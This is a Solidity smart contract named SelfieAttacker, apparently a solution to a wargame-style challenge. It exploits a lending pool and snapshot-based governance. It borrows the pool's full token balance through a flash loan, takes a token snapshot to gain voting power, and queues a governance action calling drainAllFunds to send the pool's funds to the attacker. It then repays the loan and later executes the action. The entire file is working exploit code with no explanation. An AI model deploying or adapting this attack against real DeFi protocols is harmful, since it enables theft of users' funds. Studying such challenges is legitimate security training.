//SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface ISelfiePool {
    function flashLoan(uint256) external;
    function token() external view returns(address);
    function drainAllFunds(address) external;
}

interface ISimpleGovernance {
    function governanceToken() external view returns(address);
    function queueAction(address,bytes calldata,uint256) external returns (uint256);
    function executeAction(uint256) external payable;
}

interface IERC20Snapshot {
    function transfer(address,uint256) external returns(bool);
    function balanceOf(address) external view returns(uint256);
    function approve(address,uint256) external returns(bool);
    function snapshot() external returns(uint256);
}

contract SelfieAttacker {

    ISelfiePool immutable pool;
    ISimpleGovernance immutable governance;
    address immutable owner;
    IERC20Snapshot immutable token;

    constructor(address _pool, address _governance) {
        owner = msg.sender;
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        require(ISelfiePool(_pool).token() == ISimpleGovernance(_governance).governanceToken());
        token = IERC20Snapshot(ISelfiePool(_pool).token());
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address _token, uint256 flashLoanAmount) external {
        require(_token == address(token));

        token.snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), flashLoanAmount);
    }

    function executeGovernance(uint256 actionId) external {
        governance.executeAction(actionId);
    }
}